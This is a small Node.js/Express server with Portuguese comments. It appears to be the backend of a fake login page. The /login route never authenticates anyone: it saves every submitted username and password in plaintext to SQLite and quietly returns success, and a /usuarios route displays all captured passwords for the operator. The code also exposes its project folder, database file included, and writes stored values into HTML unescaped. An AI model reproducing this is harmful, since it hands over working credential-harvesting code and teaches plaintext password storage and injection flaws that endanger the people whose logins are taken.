const express = require("express");
const bodyParser = require("body-parser");
const sqlite3 = require("sqlite3").verbose();
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

// Conecta/Cria o banco SQLite
const db = new sqlite3.Database("./meubanco.db", (err) => {
  if (err) console.error("Erro ao abrir banco:", err.message);
  else console.log("Banco conectado!");
});

// Cria a tabela se não existir
db.run(`CREATE TABLE IF NOT EXISTS usuarios (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  username TEXT,
  password TEXT
)`);

// Middlewares
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// Rota para servir o index
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// Recebe o login e salva no banco, mas não muda de página
app.post("/login", (req, res) => {
  const { username, password } = req.body;

  db.run(
    `INSERT INTO usuarios (username, password) VALUES (?, ?)`,
    [username, password],
    function (err) {
      if (err) console.error(err.message);
      // apenas envia status 200, sem abrir outra página
      res.sendStatus(200);
    }
  );
});

// Lista usuários (para você conferir)
app.get("/usuarios", (req, res) => {
  db.all("SELECT * FROM usuarios", [], (err, rows) => {
    if (err) return res.send("Erro ao buscar usuários");
    let html = "<h2>Usuários cadastrados:</h2><ul>";
    rows.forEach(u => { html += `<li>ID: ${u.id} | Usuário: ${u.username} | Senha: ${u.password}</li>`; });
    html += "</ul>";
    res.send(html);
  });
});

app.listen(PORT, () => console.log(`Servidor rodando na porta ${PORT}`));
